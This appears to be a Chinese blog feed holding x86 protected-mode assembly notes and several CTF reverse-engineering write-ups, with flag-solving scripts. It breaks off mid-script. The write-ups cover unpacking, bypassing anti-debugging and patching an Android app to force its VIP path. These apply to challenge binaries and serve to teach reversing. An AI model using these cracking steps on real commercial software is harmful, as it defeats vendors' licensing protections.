class="line">P位是由处理器负责检查的。每当通过描述符访问内存中的段时，如果P位是“0”，处理器就会产生一个异常中断。通常，该中断处理过程是由操作系统提供的，该处理过程的任务是负责将该段从硬盘换回内存，并将P位置1。在多用户、多任务的系统中，这是一种常用的虚拟内存调度策略。当内存很小，运行的程序很多时，如果计算机的运行速度变慢，并伴随着繁忙的硬盘操作时，说明这种情况正在发生。</span><br><span class="line">D/B位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志。</span><br></pre></td></tr></table></figure><blockquote><p>安装存储器的段描述符并加载GDTR</p></blockquote><p>处于实模式下，在GDT中安装描述符，必须将GDT的线性地址转换成段地址和偏移地址。</p><p>处理器规定，GDT中的第一个描述符必须是空描述符，或者叫哑描述符或NULL描述符。</p><blockquote><p>保护模式下的内存访问</p></blockquote><p>控制这达实模式和保护模式切换的开关是在一个叫CR0的寄存器。</p><p>CR0是处理器内部的控制寄存器（Control Register，CR）。之所以有个“0”后缀，是因为还有CR1、CR2、CR3和CR4控制寄存器，甚至还有CR8。<br>        CR0是32位的寄存器，包含了一系列用于控制处理器操作模式和运行状态的标志位。它的第1位（位0）是保护模式允许位（Protection Enable，PE），是开启保护模式大门的门把手，如果把该位置“1”，则处理器进入保护模式，按保护模式的规则开始运行。</p><p>保护模式下的中断机制和实模式不同，因此，原有的中断向量表不再适用，而且，必须要知道的是，在保护模式下，BIOS中断都不能再用，因为它们是实模式下的代码。在重新设置保护模式下的中断环境之前，必须关中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cli                                ;保护模式下中断机制尚未建立，应 </span><br><span class="line">                                   ;禁止中断 </span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><p>在保护模式下访问一个段时，传送到段选择器的是段选择子。它由三部分组成，第一部分是描述符的索引号，用来在描述符表中选择一个段描述符。TI 是描述符表指示器（Table Indicator），TI＝0 时，表示描述符在GDT 中；TI＝1 时，描述符在LDT 中。LDT 也是一个描述符表，和GDT 类似。RPL 是请求特权级，表示给出当前选择子的那个程序的特权级别，正是该程序要求访问这个内存段。每个程序都有特权级别，</p><blockquote><p>清空流水线并串行化处理器</p></blockquote><p>即使是在实模式下，段寄存器的描述符高速缓存器也被用于访问内存，仅低20位有效，高12位是全零。当处理器进入保护模式后，不影响段寄存器的内容和使用，它们依然是有效的，程序可以继续执行。但是，在保护模式下，对段的解释是不同的，处理器会把段选择器里的内容看成是描述符选择子，而不是逻辑段地址。因此，比较安全的做法是尽快刷新CS、SS、DS、ES、FS和GS的内容，包括它们的段选择器和描述符高速缓存器。</p><p>在进入保护模式前，有很多指令已经进入了流水线。因为处理器工作在实模式下，所以它们都是按16位操作数和16位地址长度进行译码的，即使是那些用bits 32编译的指令。进入保护模式后，由于对段地址的解释不同，对操作数和默认地址大小的解释也不同，有些指令的执行结果可能会不正确，所以必须清空流水线。同时，那些通过乱序执行得到的中间结果也是无效的，必须清理掉，让处理器串行化执行，即，重新按指令的自然顺序执行。</p><p>使用32位远转移指令jmp或者远过程调用指令call。处理器最怕转移指令，遇到这种指令，一般会清空流水线，并串行化执行；另一方面，远转移会重新加载段选择器CS，并刷新描述符高速缓存器中的内容。唯一的问题是，这条指令必须在bits 16下编译，使得处理器能够在16位模式下正确译码；同时，还必须编译成32位操作数的指令，使处理器在刚进入保护模式时能正确执行。<strong>一个建议的方法是在设置了控制寄存器CR0的PE位之后，立即用jmp或者call转移到当前指令流的下一条指令上。</strong></p><blockquote><p>保护模式下的堆栈</p></blockquote><p>堆栈是向下扩展的，因此，描述符中的段界限，和向上扩展的段含义不同。对于向上扩展的段，段内偏移量是从0开始递增，偏移量的最大值是界限值和粒度的乘积；而对于向下扩展的段来说，因为它经常用做堆栈段，而堆栈是从高地址向低地址方向推进的，故段内偏移量的最小值是界限值和粒度的乘积加一。在32位代码中，是用ESP作为堆栈指针的。因此，这里的段界限，用来和段粒度一起，决定ESP寄存器所能具有的最小值。即，堆栈操作时，必须符合条件： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ESP ＞ 段界限×粒度值</span><br></pre></td></tr></table></figure><p>对于描述符中G位是“0”的段来说，粒度值是1（字节）；而对于G位是“1”的段来说，粒度值是4096（4KB）。</p><blockquote><p>进入32位保护模式</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;设置堆栈段和栈指针 </span><br><span class="line">mov eax,cs      </span><br><span class="line">mov ss,eax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">      </span><br><span class="line">;计算GDT所在的逻辑段地址</span><br><span class="line">mov eax,[cs:pgdt+0x7c00+0x02]      ;GDT的32位线性基地址 </span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,16</span><br><span class="line">div ebx                            ;分解成16位逻辑地址 </span><br><span class="line"></span><br><span class="line">mov ds,eax                         ;令DS指向该段以进行操作</span><br><span class="line">mov ebx,edx                        ;段内起始偏移地址 </span><br><span class="line"></span><br><span class="line">;创建0#描述符，它是空描述符，这是处理器的要求</span><br><span class="line">mov dword [ebx+0x00],0x00000000</span><br><span class="line">mov dword [ebx+0x04],0x00000000  </span><br><span class="line"></span><br><span class="line">;创建1#描述符，这是一个数据段，对应0~4GB的线性地址空间</span><br><span class="line">mov dword [ebx+0x08],0x0000ffff    ;基地址为0，段界限为0xfffff</span><br><span class="line">mov dword [ebx+0x0c],0x00cf9200    ;粒度为4KB，存储器段描述符 </span><br><span class="line"></span><br><span class="line">;创建保护模式下初始代码段描述符</span><br><span class="line">mov dword [ebx+0x10],0x7c0001ff    ;基地址为0x00007c00，512字节 </span><br><span class="line">mov dword [ebx+0x14],0x00409800    ;粒度为1个字节，代码段描述符 </span><br><span class="line"></span><br><span class="line">;创建以上代码段的别名描述符</span><br><span class="line">mov dword [ebx+0x18],0x7c0001ff    ;基地址为0x00007c00，512字节</span><br><span class="line">mov dword [ebx+0x1c],0x00409200    ;粒度为1个字节，数据段描述符</span><br><span class="line"></span><br><span class="line">mov dword [ebx+0x20],0x7c00fffe</span><br><span class="line">mov dword [ebx+0x24],0x00cf9600</span><br><span class="line"></span><br><span class="line">;初始化描述符表寄存器GDTR</span><br><span class="line">mov word [cs: pgdt+0x7c00],39      ;描述符表的界限   </span><br><span class="line"> </span><br><span class="line">lgdt [cs: pgdt+0x7c00]</span><br><span class="line">      </span><br><span class="line">in al,0x92                         ;南桥芯片内的端口 </span><br><span class="line">or al,0000_0010B</span><br><span class="line">out 0x92,al                        ;打开A20</span><br><span class="line"></span><br><span class="line">cli                                ;中断机制尚未工作</span><br><span class="line"></span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><blockquote><p>内核的结构</p></blockquote><p>内核分为四个部分，分别是初始化代码、内核代码段、内核数据段和内核例程段，主引导程序也是初始化代码的组成部分。</p><p>初始化代码用于从BIOS那里接管处理器和计算机硬件的控制权，安装最基本的段描述符，初始化最初的执行环境。然后，从硬盘上读取和加载内核的剩余部分，创建组成内核的各个内存段。</p><p>内核代码段用于分配内存，读取和加载用户程序，控制用户程序的执行。</p><p>内核数据段提供了一段可读写的内存空间，供内核自己使用。<br>       内核例程段用于提供各种用途和功能的子过程以简化代码的编写。这些例程既可以用于内核，也供用户程序调用。</p><p>内核文件还包括一个头部，记录了各个段的汇编位置，这些统计数<br>据用于告诉初始化代码如何加载内核。</p><p>From <a href="https://kabeor.github.io/x86汇编从实模式到保护模式/">https://kabeor.github.io/x86汇编从实模式到保护模式/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;a href=&quot;#x86汇编-从实模式到保护模式&quot; class=&quot;headerlink&quot; title=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;/a&gt;x86汇编-从实模式到保护模式&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;注释&lt;/p
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2019科成安洵杯WP</title>
    <link href="https://kabeor.github.io/2019%E7%A7%91%E6%88%90%E5%AE%89%E6%B4%B5%E6%9D%AFWP/"/>
    <id>https://kabeor.github.io/2019科成安洵杯WP/</id>
    <published>2019-11-20T14:33:21.528Z</published>
    <updated>2019-11-20T14:55:46.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019科成安洵杯WP"><a href="#2019科成安洵杯WP" class="headerlink" title="2019科成安洵杯WP"></a>2019科成安洵杯WP</h1><h1 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h1><p>搜索flag就出来了<br><img src="https://i.loli.net/2019/11/20/8laBfNXRCobYspG.png" alt><br><img src="https://i.loli.net/2019/11/20/hoZFP4J9qlAzRyS.png" alt></p><h1 id="小游戏"><a href="#小游戏" class="headerlink" title="小游戏"></a>小游戏</h1><p>以前一道题改的，直接定位关键函数<br><img src="https://i.loli.net/2019/11/20/8udQ9FzVRr1S5jq.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">box1=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0]</span><br><span class="line"></span><br><span class="line">box2=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0]</span><br><span class="line">flag=list(range(57))</span><br><span class="line"></span><br><span class="line">for i in range(57):</span><br><span class="line">    flag[i]=box1[i]^box2[i]^0x14</span><br><span class="line">    print(chr(flag[i]),end=&quot;&quot;)  </span><br><span class="line"></span><br><span class="line"># flag&#123;&#125;tdsa|S&gt;ntXsHwndX6tXq2u~Xnis0ubtsni`Xe1sXhsobutXfubXi7sz&#125;</span><br></pre></td></tr></table></figure><h1 id="我要vip"><a href="#我要vip" class="headerlink" title="我要vip"></a>我要vip</h1><p>Android Killer修改switch强行进入vip函数即可</p><p>goto :pswitch_1<br><img src="https://i.loli.net/2019/11/20/nUPVKgELDdjs1I8.png" alt></p><p>flag{czADA_SA_ddad_aijdA}</p><h1 id="不知道什么算法"><a href="#不知道什么算法" class="headerlink" title="不知道什么算法"></a>不知道什么算法</h1><p>触法异常进入success函数，看到div可以确定是除0异常<br><img src="https://i.loli.net/2019/11/20/l4gAMZ37vVibqjo.png" alt></p><p>40135A除零异常<br>输入必须等于pop eax = 401353</p><p>flag{401353}</p><h1 id="一个简单的cm"><a href="#一个简单的cm" class="headerlink" title="一个简单的cm"></a>一个简单的cm</h1><p>Upack壳，脱壳机脱不干净，esp定律完事</p><p><img src="https://i.loli.net/2019/11/20/id6ah5BjsfOnoJu.png" alt></p><p>逻辑比较简单，逆回去即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># OEP 401ffc</span><br><span class="line"></span><br><span class="line">str1 = list(&quot;UESTCDCTF2019JustForhappy&quot;)</span><br><span class="line"></span><br><span class="line">box = list(&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;)</span><br><span class="line"></span><br><span class="line">key = list(range(len(str1)))</span><br><span class="line"></span><br><span class="line">for i in range(len(str1)):</span><br><span class="line">key[i]=box.index(str1[i])</span><br><span class="line">print(key[i],end=&apos;,&apos;)</span><br><span class="line"></span><br><span class="line">k=[]</span><br><span class="line">k=key</span><br><span class="line"></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">if k[i]&gt;=0 and k[i]&lt;=9:</span><br><span class="line">k[i]=k[i]+48</span><br><span class="line">elif k[i]&gt;=36 and k[i]&lt;=64:</span><br><span class="line">k[i]=k[i]+29</span><br><span class="line">elif k[i]&gt;=10 and k[i]&lt;=35:</span><br><span class="line">k[i]=k[i]+87</span><br><span class="line">print(&quot;flag&#123;&quot;,chr(key[i]),&quot;&#125;&quot;,end=&quot;&quot;)</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/2019科成安洵杯WP/">https://kabeor.github.io/2019科成安洵杯WP/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019科成安洵杯WP&quot;&gt;&lt;a href=&quot;#2019科成安洵杯WP&quot; class=&quot;headerlink&quot; title=&quot;2019科成安洵杯WP&quot;&gt;&lt;/a&gt;2019科成安洵杯WP&lt;/h1&gt;&lt;h1 id=&quot;ez&quot;&gt;&lt;a href=&quot;#ez&quot; class=&quot;head
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019湖湘杯线上 RE WriteUp</title>
    <link href="https://kabeor.github.io/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8ARE%20WriteUp/"/>
    <id>https://kabeor.github.io/2019湖湘杯线上RE WriteUp/</id>
    <published>2019-11-12T02:29:36.272Z</published>
    <updated>2019-11-12T04:57:15.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019湖湘杯线上-RE-WriteUp"><a href="#2019湖湘杯线上-RE-WriteUp" class="headerlink" title="2019湖湘杯线上 RE WriteUp"></a>2019湖湘杯线上 RE WriteUp</h1><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>UPX壳，脱壳机即可<br><img src="https://i.loli.net/2019/11/12/jqJv27PZzWxYHFl.png" alt="image.png"></p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>主函数逻辑如下<br><img src="https://i.loli.net/2019/11/12/aLJfMiovY8u4psT.png" alt="image.png"></p><p>检测命令行输入格式为 文件名 flag.txt</p><p>flag.txt由如下脚本解得。</p><p><img src="https://i.loli.net/2019/11/12/R8lLtbvHrVMDcxw.png" alt="image.png"></p><p>之后读入txt，检测输入为32位<br>       然后进入两个处理函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub_4113B1(xmm0_4_0, &amp;Buf, &amp;unk_41A4E0);  // 处理1</span><br><span class="line">if ( sub_4113B6(xmm0_4_0, &amp;unk_41A4E0) )  // 处理2</span><br></pre></td></tr></table></figure><p><strong>处理1</strong></p><p><img src="https://i.loli.net/2019/11/12/lAuqRQ8NUp2fBVj.png" alt="image.png"></p><p>将输入每两位一起进行处理，判断两位中的第一个值是否在与0-9或a-f中，如果在就减去48或87，<br>这里的数组将在处理2中作为验证数据。</p><p><strong>处理2</strong></p><p><img src="https://i.loli.net/2019/11/12/xgRSojfDydc3Opl.png" alt="image.png"></p><p>第一位左移4位+第二位的结果加上1与dword_41A078数据进行比较。</p><p><strong>flag脚本</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag = [0x50, 0xC6, 0xF1, 0xE4, 0xE3, 0xE2, 0x9A, 0xA1,0xA7,0xde,0xda,70,171,46,255,219]</span><br><span class="line">s = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in flag:</span><br><span class="line">    i -= 1</span><br><span class="line">    s += str(hex(i&gt;&gt;4))[2:]</span><br><span class="line">    s += str(hex(i&amp;0xf))[2:]</span><br><span class="line"></span><br><span class="line">print s</span><br></pre></td></tr></table></figure></p><h2 id="esrever"><a href="#esrever" class="headerlink" title="esrever"></a>esrever</h2><p>迷宫,动态反调试没什么用</p><p><img src="https://i.loli.net/2019/11/12/CvUN6KQDSJilu7c.png" alt="image.png"><br>输入比较巧妙，过反调试以后动态调很复杂，但很清晰看到是控制7*7二维数组上下左右</p><p><img src="https://i.loli.net/2019/11/12/c5oH6DYshdEWUp3.png" alt="image.png"></p><p>提取迷宫<br><img src="https://i.loli.net/2019/11/12/4jl2mHYWAFXQUBg.png" alt="image.png"></p><p>知道映射关系就不用考虑输入，直接考虑输出是什么就可以了。<br><img src="https://i.loli.net/2019/11/12/jCDMgiAa3sIJwP8.png" alt="image.png"></p><p>#FFRFFF####ZZRZZZ##FF#FFFF</p><h2 id="icekey"><a href="#icekey" class="headerlink" title="icekey"></a>icekey</h2><p>.NET程序，直接上dnSpy</p><p>定位到关键函数位置<br><img src="https://i.loli.net/2019/11/12/pfuCB8hsnV7D643.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/11/12/giOozl1pJQ5sryc.png" alt="image.png"></p><p>关键算法如下<br><img src="https://i.loli.net/2019/11/12/LSAUMI9lTvhPoNd.png" alt="image.png"></p><p>使用了IceKey公钥算法<br><img src="https://upload.wikimedia.org/wikipedia/commons/d/df/ICE_%28cipher%29_InfoBox_Diagram.png" alt="Ice"></p><p>这里加解密都已经封装好了，key是字符串iriszero的md5值<br>内部加密没有做任何改动，有兴趣可以对比官方实现  <a href="http://www.darkside.com.au/ice/" target="_blank" rel="noopener">http://www.darkside.com.au/ice/</a></p><p>最后加密的密文和<code>string b = &quot;3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A&quot;;</code>比较</p><p>既然下面给了解密流程，那就不好意思了<br>观察到bytes数组存放明文，array数组存放密文，因此只需要动态调试在解密前将array内的值改为b，解密后查看bytes值即可<br>注意：要构造和b/2等长即32位伪flag才能申请到足够的数组长度。</p><p><img src="https://i.loli.net/2019/11/12/4Gki5WQzLHmEand.png" alt></p><p><img src="https://i.loli.net/2019/11/12/zBXVFqnj35vtLdI.png" alt></p><p>修改完记得右键刷新才能在局部变量中显示</p><p>运行解密函数后查看bytes数组内存如下，即为flag<br><img src="https://i.loli.net/2019/11/12/jZadOwUSgrpvqG5.png" alt></p><p>flag：5acb06231724c8c369bae711166dbe85</p><p>验证一下<br><img src="https://i.loli.net/2019/11/12/yIuPFcG4VoavpHf.png" alt></p><p>From <a href="https://kabeor.github.io/2019湖湘杯线上RE WriteUp/">https://kabeor.github.io/2019湖湘杯线上RE WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019湖湘杯线上-RE-WriteUp&quot;&gt;&lt;a href=&quot;#2019湖湘杯线上-RE-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;2019湖湘杯线上 RE WriteUp&quot;&gt;&lt;/a&gt;2019湖湘杯线上 RE WriteUp&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>2018护网杯线上 APM233</title>
    <link href="https://kabeor.github.io/2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%20APM233/"/>
    <id>https://kabeor.github.io/2018护网杯线上 APM233/</id>
    <published>2019-07-31T09:12:43.513Z</published>
    <updated>2019-08-02T07:09:58.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018护网杯线上-APM233"><a href="#2018护网杯线上-APM233" class="headerlink" title="2018护网杯线上 APM233"></a>2018护网杯线上 APM233</h1><p>MFC42的逆向</p><p><img src="https://i.loli.net/2019/07/31/5d4156590c9ba50005.jpg" alt></p><p>一共四层验证，IDA打开后基本全红，直接按P创建函数<br>花指令格式为<code>jz address+1;  jnz address+1;</code>,因此显示出address处的opcode，按D设为数据，address+1处创建函数，平衡栈帧即可</p><p>主流程<br><img src="https://i.loli.net/2019/07/31/5d41579664ffd31971.jpg" alt><br><img src="https://i.loli.net/2019/07/31/5d4157b6c3bce90900.jpg" alt></p><h2 id="Check1"><a href="#Check1" class="headerlink" title="Check1"></a>Check1</h2><p>第一层与字符串1d2e3c4a比较</p><h2 id="Check2"><a href="#Check2" class="headerlink" title="Check2"></a>Check2</h2><p><img src="https://i.loli.net/2019/07/31/5d415857c43ac44867.jpg" alt></p><p>z3直接计算<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">from z3 <span class="keyword">import</span> *</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Dr0 = BitVec('Dr0',32)</span><br><span class="line">Dr1 = BitVec('Dr1',32)</span><br><span class="line">Dr2 = BitVec('Dr2',32)</span><br><span class="line">Dr3 = BitVec('Dr3',32)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(Dr0 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr2 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr3 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1+Dr0 == <span class="number">0x899a9d9c</span>)</span><br><span class="line">s.add(Dr2+Dr1 == <span class="number">0x384989ED</span>)</span><br><span class="line">s.add(Dr3+Dr2 == <span class="number">0x2B2C85BC</span>)</span><br><span class="line">s.add(Dr0-Dr3 == <span class="number">0xAFAFDC11</span>)</span><br><span class="line"></span><br><span class="line">s.check()    </span><br><span class="line"></span><br><span class="line">m = s.model() </span><br><span class="line"></span><br><span class="line">Dr0 = int('%s'%m[Dr0])</span><br><span class="line">Dr1 = int('%s'%m[Dr1])</span><br><span class="line">Dr2 = int('%s'%m[Dr2])</span><br><span class="line">Dr3 = int('%s'%m[Dr3])</span><br><span class="line">    </span><br><span class="line">ans = '%s%s%s%s'%(p32(Dr0).encode('hex'),p32(Dr1).encode('hex'),p32(Dr2).encode('hex'),p32(Dr3).encode('hex'))</span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure></p><p>不知道为什么我这里的数值和别人的不一样，算出来的也不一样。。。正确结果应该是efbe3323adde6666feca1313beba1414</p><h2 id="Check3"><a href="#Check3" class="headerlink" title="Check3"></a>Check3</h2><p>各种反调试虚拟机检测，未检测到的返回值就是key：    0acb7935481efc12<br><img src="https://i.loli.net/2019/07/31/5d4158ff4387664889.jpg" alt></p><h2 id="Check4"><a href="#Check4" class="headerlink" title="Check4"></a>Check4</h2><p><img src="https://i.loli.net/2019/07/31/5d415a2bef10158583.jpg" alt></p><p><img src="https://i.loli.net/2019/07/31/5d415a3fd47ee42987.jpg" alt></p><p>要求玩家的位置不能与三个AI重合，玩家每次的可走的步数为1-4，AI的行动路线如下所示<br><code>a1 = [4, -1, 6, -1, 3, 2, 4, 1, 3, -1, 5, 1, 2, -1, 5, 1, 3, -2, 7, 0, 2, 3, 5, 0, 5, 0, 5, 2, 1, -2, 6, -1, 3, 3, 4, 0, 5, -1, 6, 0, 4, 0, 7, 0, 5, -2, 7, 2, 2, -1, 6, 2, 2, 1, 5, 0, 2, 0, 3, 0, 4, 0, 6, -1, 5, 0, 5, 3, 0, 5, 3, 2]</code><br><code>a2 = [2, 2, 3, 3, 3, -2, 7, 1, 1, 1, 5, 1, 0, 2, 5, 1, 0, 0, 4, 0, 7, 2, 2, 0, 4, 1, 3, 4, 0, 1, 6, -1, 5, -1, 3, 5, 1, 2, 5, 0, 5, 0, 2, 5, 1, 1, 5, 2, 2, 1, 2, 3, 5, -1, 4, 1, 2, -1, 7, 1, 2, 2, 1, 2, 5, 0, 5, 0, 5, -1, 3, 2]</code><br><code>a3 = [3, -1, 6, -1, 5, 0, 4, 0, 2, 5, 0, 5, 1, -1, 5, 1, 0, 2, 4, 0, 5, 0, 4, 0, 6, -1, 6, 1, 2, 1, 3, 3, 2, 3, 3, 0, 5, -1, 4, 0, 6, 0, 5, 0, 5, 1, 2, 2, 3, 0, 5, 5, 0, 0, 6, 2, -1, 1, 5, 1, 0, 3, 4, -1, 4, 5, 0, 2, 5, 1, 4, 1]</code><br>通过上述规则，可以得到玩家的路线为<br><code>[1, 4, 1, 3, 1, 4, 1, 2, 2, 3, 2, 1, 1, 4, 1, 1, 1, 4, 1, 4, 2, 3, 1, 4, 1, 4, 2, 1, 1, 4, 1, 3, 2, 3, 2, 3, 1, 4, 1, 4, 1, 4, 2, 3, 1, 4, 2, 2, 1, 4, 3, 2, 1, 4, 1, 1, 1, 4, 1, 2, 2, 3, 1, 4, 2, 3, 2, 3, 2, 3, 2, 3]</code><br>玩家的行动由输入b64encode后再将编码后的结果拆为两两一组</p><p>脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level4</span><span class="params">()</span>:</span></span><br><span class="line">    a1 = [<span class="number">4</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-2</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a2 = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a3 = [<span class="number">3</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">5</span>, <span 